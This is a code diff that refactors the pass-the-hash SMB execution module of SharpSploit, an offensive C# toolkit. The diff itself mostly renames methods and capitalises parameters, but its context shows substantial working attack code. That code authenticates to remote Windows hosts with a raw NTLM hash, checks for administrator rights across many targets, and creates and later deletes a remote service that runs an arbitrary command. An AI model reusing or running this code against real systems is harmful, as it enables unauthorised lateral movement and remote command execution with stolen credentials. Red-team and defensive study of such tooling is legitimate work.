@@ -1,4 +1,11 @@
-﻿using System;
+﻿// Author: Ryan Cobb (@cobbr_io)
+// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
+// License: BSD 3-Clause
+
+using SharpSploit.Execution;
+using SharpSploit.Misc;
+
+using System;
 using System.Collections.Generic;
 using System.Collections.Specialized;
 using System.Diagnostics;
@@ -7,8 +14,6 @@ using System.Net.Sockets;
 using System.Security.Cryptography;
 using System.Text;
 using System.Threading;
-using SharpSploit.Execution;
-using SharpSploit.Misc;
 
 namespace SharpSploit.LateralMovement
 {
@@ -17,9 +22,9 @@ namespace SharpSploit.LateralMovement
          /// <summary>
         /// Determines if a username and hash has administrative privilege on a Target
         /// </summary>
-        /// <param name="username">The Username to query.</param>
-        /// <param name="hash">The NTLM hash for the user</param>
-        /// <param name="domain">The logon domain for the user</param>
+        /// <param name="Username">The Username to query.</param>
+        /// <param name="Hash">The NTLM hash for the user</param>
+        /// <param name="Domain">The logon domain for the user</param>
         /// <param name="Target">The Target to query.</param>
         /// <returns>True for Admin, False for not.</returns>
         /// <author>Scottie Austin (@checkymander)</author>
@@ -27,42 +32,41 @@ namespace SharpSploit.LateralMovement
         /// Based Heavily on Kevin Robertsons Invoke-TheHash toolset (Found
         /// at https://github.com/Kevin-Robertson/Invoke-TheHash)
         /// </remarks>
-        public static bool SMBAdminCheckWithHash(string username, string hash, string domain, string Target)
+        public static bool AdminCheck(string Username, string Hash, string Domain, string Target)
         {
-            string result = SMBExecuteWithHash(username, hash, domain, Target, AdminCheck: true);
+            string result = SMBExecute(Username, Hash, Domain, Target, AdminCheck: true);
             if (result.Contains(" is a local administrator on "))
                 return true;
             else
                 return false;
         }
 
-
         /// <summary>
         /// Execute a command against multiple targets using Pass the Hash and SMB
         /// </summary>
-        /// <param name="username">The username to log on as.</param>
-        /// <param name="hash">The NTLM hash for the user.</param>
-        /// <param name="domain">The logon domain for the user.</param>
-        /// <param name="targets">The Target computers to run the command on.</param>
-        /// <param name="command">The Command to execute on the Target</param>
-        /// <param name="sleep">Sleeptime between actions. Set this if getting unknown failures. (default=15). </param>
+        /// <param name="Username">The username to log on as.</param>
+        /// <param name="Hash">The NTLM hash for the user.</param>
+        /// <param name="Domain">The logon domain for the user.</param>
+        /// <param name="Targets">The Target computers to run the command on.</param>
+        /// <param name="Command">The Command to execute on the Target</param>
+        /// <param name="Sleep">Sleeptime between actions. Set this if getting unknown failures. (default=15). </param>
         /// <param name="ServiceName">The name to give the SMB service for execution.</param>
         /// <param name="AdminCheck">Check only if user is Admin on targets.</param>
         /// <param name="ComSpec">Append %COMSPEC% /C to command. (default=true)</param>
         /// <param name="ForceSMB1">Force usage of SMBv1.</param>
-        /// <param name="debug">Include debug information in the output.</param>
+        /// <param name="Debug">Include debug information in the output.</param>
         /// <returns>Returns a string containing execution results.</returns>
         /// <author>Scottie Austin (@checkymander)</author>
         /// <remarks>
         /// Based Heavily on Kevin Robertsons Invoke-TheHash toolset (Found
         /// at https://github.com/Kevin-Robertson/Invoke-TheHash)
         /// </remarks>
-        public static string SMBExecuteWithHash(string username, string hash, string domain, List<string> targets, string command = "", int sleep = 15, string ServiceName = "", bool AdminCheck = false, bool ComSpec = true, bool ForceSMB1 = false, bool debug = false)
+        public static string SMBExecute(string Username, string Hash, string Domain, List<string> Targets, string Command = "", int Sleep = 15, string ServiceName = "", bool AdminCheck = false, bool ComSpec = true, bool ForceSMB1 = false, bool Debug = false)
         {
             StringBuilder sb = new StringBuilder();
-            foreach (var Target in targets)
+            foreach (var Target in Targets)
             {
-                sb.AppendLine(SMBExecuteWithHash(username, hash, domain, Target, command, sleep, ServiceName, AdminCheck, ComSpec, ForceSMB1, debug));
+                sb.AppendLine(SMBExecute(Username, Hash, Domain, Target, Command, Sleep, ServiceName, AdminCheck, ComSpec, ForceSMB1, Debug));
             }
 
             return sb.ToString();
@@ -71,24 +75,24 @@ namespace SharpSploit.LateralMovement
         /// <summary>
         /// Execute a command against multiple targets using Pass the Hash and SMB
         /// </summary>
-        /// <param name="username">The username to log on as.</param>
-        /// <param name="hash">The NTLM hash for the user.</param>
-        /// <param name="domain">The logon domain for the user.</param>
+        /// <param name="Username">The username to log on as.</param>
+        /// <param name="Hash">The NTLM hash for the user.</param>
+        /// <param name="Domain">The logon domain for the user.</param>
         /// <param name="Target">The Target computer to run the command on.</param>
-        /// <param name="command">The Command to execute on the Target</param>
-        /// <param name="sleep">Sleeptime between actions. Set this if getting unknown failures. (default=15). </param>
+        /// <param name="Command">The Command to execute on the Target</param>
+        /// <param name="Sleep">Sleeptime between actions. Set this if getting unknown failures. (default=15). </param>
         /// <param name="ServiceName">The name to give the SMB service for execution.</param>
         /// <param name="AdminCheck">Check only if user is Admin on targets.</param>
         /// <param name="ComSpec">Append %COMSPEC% /C to command. (default=true)</param>
         /// <param name="ForceSMB1">Force usage of SMBv1.</param>
-        /// <param name="debug">Include debug information in the output.</param>
+        /// <param name="Debug">Include debug information in the output.</param>
         /// <returns>Returns a string containing execution results.</returns>
         /// <author>Scottie Austin (@checkymander)</author>
         /// <remarks>
         /// Based Heavily on Kevin Robertsons Invoke-TheHash toolset (Found
         /// at https://github.com/Kevin-Robertson/Invoke-TheHash)
         /// </remarks>
-        public static string SMBExecuteWithHash(string username, string hash, string domain, string Target, string command = "", int sleep = 15, string ServiceName = "", bool AdminCheck = false, bool ComSpec = true, bool ForceSMB1 = false, bool debug = false)
+        public static string SMBExecute(string Username, string Hash, string Domain, string Target, string Command = "", int Sleep = 15, string ServiceName = "", bool AdminCheck = false, bool ComSpec = true, bool ForceSMB1 = false, bool Debug = false)
         {
             //Trackers
             bool Login_Successful = false;
@@ -146,27 +150,27 @@ namespace SharpSploit.LateralMovement
             OrderedDictionary Packet_SCM_Data = null;
             MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
 
-            if (String.IsNullOrEmpty(username) || String.IsNullOrEmpty(hash) || String.IsNullOrEmpty(Target))
+            if (String.IsNullOrEmpty(Username) || String.IsNullOrEmpty(Hash) || String.IsNullOrEmpty(Target))
             {
                 output.AppendLine("Missing Required Params");
             }
             else
             {
-                if (hash.Contains(":"))
-                    hash = hash.Split(':').Last();
+                if (Hash.Contains(":"))
+                    Hash = Hash.Split(':').Last();
             }
-            if (!string.IsNullOrEmpty(domain))
-                Output_Username = domain + '\\' + username;
+            if (!string.IsNullOrEmpty(Domain))
+                Output_Username = Domain + '\\' + Username;
             else
-                Output_Username = username;
+                Output_Username = Username;
 
 
             if (!AdminCheck)
             {
-                if (debug) { output.AppendLine("AdminCheck is false"); }
-                if (!string.IsNullOrEmpty(command))
+                if (Debug) { output.AppendLine("AdminCheck is false"); }
+                if (!string.IsNullOrEmpty(Command))
                 {
-                    if (debug) { output.AppendLine("String is not empty"); }
+                    if (Debug) { output.AppendLine("String is not empty"); }
                     SMB_execute = true;
                 }
             }
@@ -185,14 +189,14 @@ namespace SharpSploit.LateralMovement
 
             if (SMBClient.Connected)
             {
-                if (debug) { output.AppendLine(String.Format("Connected to {0}", Target)); }
+                if (Debug) { output.AppendLine(String.Format("Connected to {0}", Target)); }
                 NetworkStream SMBClientStream = SMBClient.GetStream();
                 SMBClientReceive = new byte[1024];
                 string SMBClientStage = "NegotiateSMB";
 
                 while (SMBClientStage != "exit")
                 {
-                    if (debug) { output.AppendLine(String.Format("Current Stage: {0}", SMBClientStage)); }
+                    if (Debug) { output.AppendLine(String.Format("Current Stage: {0}", SMBClientStage)); }
                     switch (SMBClientStage)
                     {
                         case "NegotiateSMB":
@@ -209,11 +213,11 @@ namespace SharpSploit.LateralMovement
                                 if (BitConverter.ToString(new byte[] { SMBClientReceive[4], SMBClientReceive[5], SMBClientReceive[6], SMBClientReceive[7] }).ToLower() == "ff-53-4d-42")
                                 {
                                     ForceSMB1 = true;
-                                    if (debug) { output.AppendLine("Using SMB1"); }
+                                    if (Debug) { output.AppendLine("Using SMB1"); }
                                     SMBClientStage = "NTLMSSPNegotiate";
                                     if (BitConverter.ToString(new byte[] { SMBClientReceive[39] }).ToLower() == "0f")
                                     {
-                                        if (debug) { output.AppendLine("SMB Signing is Enabled"); }
+                                        if (Debug) { output.AppendLine("SMB Signing is Enabled"); }
                                         SMB_Signing = true;
                                         SMB_Session_Key_Length = new byte[] { 0x00, 0x00 };
                                         SMB_Negotiate_Flags = new byte[] { 0x15, 0x82, 0x08, 0xa0 };
@@ -221,7 +225,7 @@ namespace SharpSploit.LateralMovement
                                     }
                                     else
                                     {
-                                        if (debug) { output.AppendLine("SMB Signing is not Enforced"); }
+                                        if (Debug) { output.AppendLine("SMB Signing is not Enforced"); }
                                         SMB_Signing = false;
                                         SMB_Session_Key_Length = new byte[] { 0x00, 0x00 };
                                         SMB_Negotiate_Flags = new byte[] { 0x05, 0x82, 0x08, 0xa0 };
@@ -230,18 +234,18 @@ namespace SharpSploit.LateralMovement
                                 }
                                 else
                                 {
-                                    if (debug) { output.AppendLine("Using SMB2"); }
+                                    if (Debug) { output.AppendLine("Using SMB2"); }
                                     SMBClientStage = "NegotiateSMB2";
                                     if (BitConverter.ToString(new byte[] { SMBClientReceive[70] }) == "03")
                                     {
-                                        if (debug) { output.AppendLine("SMB Signing is Enabled"); }
+                                        if (Debug) { output.AppendLine("SMB Signing is Enabled"); }
                                         SMB_Signing = true;
                                         SMB_Session_Key_Length = new byte[] { 0x00, 0x00 };
                                         SMB_Negotiate_Flags = new byte[] { 0x15, 0x82, 0x08, 0xa0 };
                                     }
                                     else
                                     {
-                                        if (debug) { output.AppendLine("SMB Signing is not Enforced"); }
+                                        if (Debug) { output.AppendLine("SMB Signing is not Enforced"); }
                                         SMB_Signing = false;
                                         SMB_Session_Key_Length = new byte[] { 0x00, 0x00 };
                                         SMB_Negotiate_Flags = new byte[] { 0x05, 0x80, 0x08, 0xa0 };
@@ -306,7 +310,7 @@ namespace SharpSploit.LateralMovement
 
                     }
                 }
-                if (debug) { output.AppendLine(String.Format("Authenticating to {0}", Target)); }
+                if (Debug) { output.AppendLine(String.Format("Authenticating to {0}", Target)); }
                 string SMB_NTLSSP = BitConverter.ToString(SMBClientReceive);
                 SMB_NTLSSP = SMB_NTLSSP.Replace("-", "");
                 int SMB_NTLMSSP_Index = SMB_NTLSSP.IndexOf("4E544C4D53535000");
@@ -319,12 +323,12 @@ namespace SharpSploit.LateralMovement
                 SMB_Target_Details = Utilities.GetByteRange(SMBClientReceive, (SMB_NTLMSSP_Bytes_Index + 56 + SMB_Domain_Length), (SMB_NTLMSSP_Bytes_Index + 55 + SMB_Domain_Length + SMB_Target_Length));
                 byte[] SMB_Target_Time_Bytes = Utilities.GetByteRange(SMB_Target_Details, SMB_Target_Details.Length - 12, SMB_Target_Details.Length - 5);
                 string hash2 = "";
-                for (int i = 0; i < hash.Length - 1; i += 2) { hash2 += (hash.Substring(i, 2) + "-"); };
-                byte[] NTLM_hash_bytes = (Utilities.ConvertStringToByteArray(hash.Replace("-", "")));
+                for (int i = 0; i < Hash.Length - 1; i += 2) { hash2 += (Hash.Substring(i, 2) + "-"); };
+                byte[] NTLM_hash_bytes = (Utilities.ConvertStringToByteArray(Hash.Replace("-", "")));
                 string Auth_Hostname = Environment.MachineName;
                 byte[] Auth_Hostname_Bytes = Encoding.Unicode.GetBytes(Auth_Hostname);
-                byte[] Auth_Domain_Bytes = Encoding.Unicode.GetBytes(domain);
-                byte[] Auth_Username_Bytes = Encoding.Unicode.GetBytes(username);
+                byte[] Auth_Domain_Bytes = Encoding.Unicode.GetBytes(Domain);
+                byte[] Auth_Username_Bytes = Encoding.Unicode.GetBytes(Username);
                 byte[] Auth_Domain_Length = BitConverter.GetBytes(Auth_Domain_Bytes.Length);
                 Auth_Domain_Length = new byte[] { Auth_Domain_Length[0], Auth_Domain_Length[1] };
                 byte[] Auth_Username_Length = BitConverter.GetBytes(Auth_Username_Bytes.Length);
@@ -338,7 +342,7 @@ namespace SharpSploit.LateralMovement
                 byte[] Auth_NTLM_Offset = BitConverter.GetBytes(Auth_Domain_Bytes.Length + Auth_Username_Bytes.Length + Auth_Hostname_Bytes.Length + 88);
                 HMACMD5 HMAC_MD5 = new HMACMD5();
                 HMAC_MD5.Key = NTLM_hash_bytes;
-                string Username_And_Target = username.ToUpper();
+                string Username_And_Target = Username.ToUpper();
                 byte[] Username_Bytes = Encoding.Unicode.GetBytes(Username_And_Target);
                 byte[] Username_And_Target_bytes = Username_Bytes.Concat(Auth_Domain_Bytes).ToArray();
                 byte[] NTLMv2_hash = HMAC_MD5.ComputeHash(Username_And_Target_bytes);
@@ -434,7 +438,7 @@ namespace SharpSploit.LateralMovement
                 {
                     if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 9, 12)) == "00-00-00-00")
                     {
-                        if (debug) { output.AppendLine("Authentication Successful"); }
+                        if (Debug) { output.AppendLine("Authentication Successful"); }
                         Login_Successful = true;
                     }
                     else
@@ -447,7 +451,7 @@ namespace SharpSploit.LateralMovement
                 {
                     if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 12, 15)) == "00-00-00-00")
                     {
-                        if (debug) { output.AppendLine("Authentication Successful"); }
+                        if (Debug) { output.AppendLine("Authentication Successful"); }
                         Login_Successful = true;
                     }
                     else
@@ -457,7 +461,7 @@ namespace SharpSploit.LateralMovement
                     }
                 }
 
-                if (debug) { output.AppendLine(String.Format("Login Status: {0}", Login_Successful)); }
+                if (Debug) { output.AppendLine(String.Format("Login Status: {0}", Login_Successful)); }
                 if (Login_Successful)
                 {
                     byte[] SMBExec_Command;
@@ -496,17 +500,17 @@ namespace SharpSploit.LateralMovement
                             SMB_Service_Bytes = SMB_Service_Bytes.Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                         }
                     }
-                    if (debug) { output.AppendLine(String.Format("Service Name is {0}", SMB_Service)); }
+                    if (Debug) { output.AppendLine(String.Format("Service Name is {0}", SMB_Service)); }
                     byte[] SMB_Service_Length = BitConverter.GetBytes(SMB_Service.Length + 1);
 
                     if (ComSpec)
                     {
-                        if (debug) { output.AppendLine("Appending %COMSPEC% /C"); }
+                        if (Debug) { output.AppendLine("Appending %COMSPEC% /C"); }
 
-                        command = "%COMSPEC% /C \"" + command + "\"";
+                        Command = "%COMSPEC% /C \"" + Command + "\"";
                     }
 
-                    byte[] commandBytes = Encoding.UTF8.GetBytes(command);
+                    byte[] commandBytes = Encoding.UTF8.GetBytes(Command);
                     List<byte> SMBExec_Command_List = new List<byte>();
                     foreach (byte commandByte in commandBytes)
                     {
@@ -516,7 +520,7 @@ namespace SharpSploit.LateralMovement
                     }
                     byte[] SMBExec_Command_Init = SMBExec_Command_List.ToArray();
 
-                    if (Convert.ToBoolean(command.Length % 2))
+                    if (Convert.ToBoolean(Command.Length % 2))
                     {
                         SMBExec_Command = SMBExec_Command_Init.Concat(new byte[] { 0x00, 0x00 }).ToArray();
                     }
@@ -534,7 +538,7 @@ namespace SharpSploit.LateralMovement
                         SMBClientStage = "TreeConnectAndXRequest";
                         while (SMBClientStage != "exit" && SMBExec_Failed == false)
                         {
-                            if (debug) { output.AppendLine(String.Format("Current Stage {0}", SMBClientStage)); }
+                            if (Debug) { output.AppendLine(String.Format("Current Stage {0}", SMBClientStage)); }
                             switch (SMBClientStage)
                             {
                                 case "TreeConnectAndXRequest":
@@ -635,7 +639,7 @@ namespace SharpSploit.LateralMovement
                                     break;
                                 case "ReadAndXRequest":
                                     {
-                                        Thread.Sleep(sleep * 1000);
+                                        Thread.Sleep(Sleep * 1000);
                                         Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x2e }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_Tree_ID, Process_ID_Bytes, SMB_User_ID);
                                         if (SMB_Signing)
                                         {
@@ -730,7 +734,7 @@ namespace SharpSploit.LateralMovement
                                         }
                                         else
                                         {
-                                            if (debug)
+                                            if (Debug)
                                             {
                                                 output.AppendLine(BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 108, 111)));
                                                 output.AppendLine(BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 88, 107)));
@@ -952,12 +956,12 @@ namespace SharpSploit.LateralMovement
                                     {
                                         if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 88, 91)) == "1D-04-00-00")
                                         {
-                                            if (debug) { output.AppendLine(String.Format("Command Executed with ServiceName: {0} on {1}", SMB_Service, Target)); }
+                                            if (Debug) { output.AppendLine(String.Format("Command Executed with ServiceName: {0} on {1}", SMB_Service, Target)); }
                                         }
                                         else if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 88, 91)) == "02-00-00-00")
                                         {
                                             SMBExec_Failed = true;
-                                            if (debug) { output.AppendLine(String.Format("Service {0} failed to start on {1}", SMB_Service, Target)); }
+                                            if (Debug) { output.AppendLine(String.Format("Service {0} failed to start on {1}", SMB_Service, Target)); }
                                         }
                                         Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_Tree_ID, Process_ID_Bytes, SMB_User_ID);
 
@@ -999,7 +1003,7 @@ namespace SharpSploit.LateralMovement
                                         Packet_SCM_Data = new OrderedDictionary();
                                         if (SMB_Close_Service_Handle_Stage == 1)
                                         {
-                                            if (debug) { output.AppendLine(String.Format("Service {0} deleted on {1}", SMB_Service, Target)); }
+                                            if (Debug) { output.AppendLine(String.Format("Service {0} deleted on {1}", SMB_Service, Target)); }
                                             Service_Deleted = true;
                                             SMB_Close_Service_Handle_Stage++;
                                             Packet_SCM_Data = SMBExec.SCMCloseServiceHandle(SMB_Service_Context_Handle);
@@ -1139,7 +1143,7 @@ namespace SharpSploit.LateralMovement
 
                         while (SMBClientStage != "exit" && SMBExec_Failed == false)
                         {
-                            if (debug) { output.AppendLine(String.Format("Current Stage {0}", SMBClientStage)); }
+                            if (Debug) { output.AppendLine(String.Format("Current Stage {0}", SMBClientStage)); }
                             switch (SMBClientStage)
                             {
                                 case "TreeConnect":
@@ -1236,7 +1240,7 @@ namespace SharpSploit.LateralMovement
                                     break;
                                 case "ReadRequest":
                                     {
-                                        Thread.Sleep(sleep * 1000);
+                                        Thread.Sleep(Sleep * 1000);
                                         SMB2_Message_ID++;
                                         Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x08, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                         Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
@@ -1518,7 +1522,7 @@ namespace SharpSploit.LateralMovement
                                     {
                                         if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 132, 135)) == "00-00-00-00")
                                         {
-                                            if (debug) { output.AppendLine(String.Format("Service {0} created on {1}", SMB_Service, Target)); }
+                                            if (Debug) { output.AppendLine(String.Format("Service {0} created on {1}", SMB_Service, Target)); }
                                             SMB_Service_Context_Handle = Utilities.GetByteRange(SMBClientReceive, 112, 131);
                                             SMB2_Message_ID += 20;
                                             Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x09, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
@@ -1552,12 +1556,12 @@ namespace SharpSploit.LateralMovement
                                         }
                                         else if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 132, 135)) == "31-04-00-00")
                                         {
-                                            if (debug) { output.AppendLine(String.Format("Service {0} creation failed on {1}", SMB_Service, Target)); }
+                                            if (Debug) { output.AppendLine(String.Format("Service {0} creation failed on {1}", SMB_Service, Target)); }
                                             SMBExec_Failed = true;
                                         }
                                         else
                                         {
-                                            if (debug) { output.AppendLine("Service Creation Fault Context Mismatch."); }
+                                            if (Debug) { output.AppendLine("Service Creation Fault Context Mismatch."); }
                                             SMBExec_Failed = true;
                                         }
                                     }
@@ -1612,7 +1616,7 @@ namespace SharpSploit.LateralMovement
                                     {
                                         if (SMB_Close_Service_Handle_Stage == 1)
                                         {
-                                            if (debug) { output.AppendLine(String.Format("Service {0} deleted on {1}", SMB_Service, Target)); }
+                                            if (Debug) { output.AppendLine(String.Format("Service {0} deleted on {1}", SMB_Service, Target)); }
                                             Service_Deleted = true;
                                             SMB2_Message_ID += 20;
                                             SMB_Close_Service_Handle_Stage++;
@@ -1750,6 +1754,7 @@ namespace SharpSploit.LateralMovement
 
             return output.ToString();
         }
+        
         private static byte[] GetNetBIOSSessionService(int SMB_Header_Length, int RPC_Data_Length)
         {
             OrderedDictionary Packet_NetBIOS_Session_Service = SMBExec.NetBIOSSessionService(SMB_Header_Length, RPC_Data_Length);
